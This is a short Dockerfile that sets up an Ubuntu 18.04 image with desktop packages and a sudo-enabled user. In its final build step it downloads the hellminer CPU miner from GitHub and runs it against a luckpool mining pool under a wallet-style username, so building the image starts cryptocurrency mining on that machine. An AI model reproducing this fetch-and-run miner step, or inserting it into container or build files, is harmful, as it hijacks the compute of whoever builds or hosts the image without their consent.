FROM ubuntu:18.04
ENV DEBIAN_FRONTEND=noninteractive

RUN set -ex; \
    apt-get update \
    && apt-get install -y --no-install-recommends \
    ubuntu-desktop \
    sudo \
    bash \
    curl \
    git \
	  unzip \
	  wget \
	  && apt-get update \
	  && apt-get upgrade -y \
    && apt-get autoclean \
    && apt-get autoremove \
    && rm -rf /var/lib/apt/lists/*

RUN useradd -m kunemuse && \
    adduser kunemuse sudo && \
    sudo usermod -a -G sudo kunemuse

RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && chmod +x hellminer && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r.VM --cpu 4
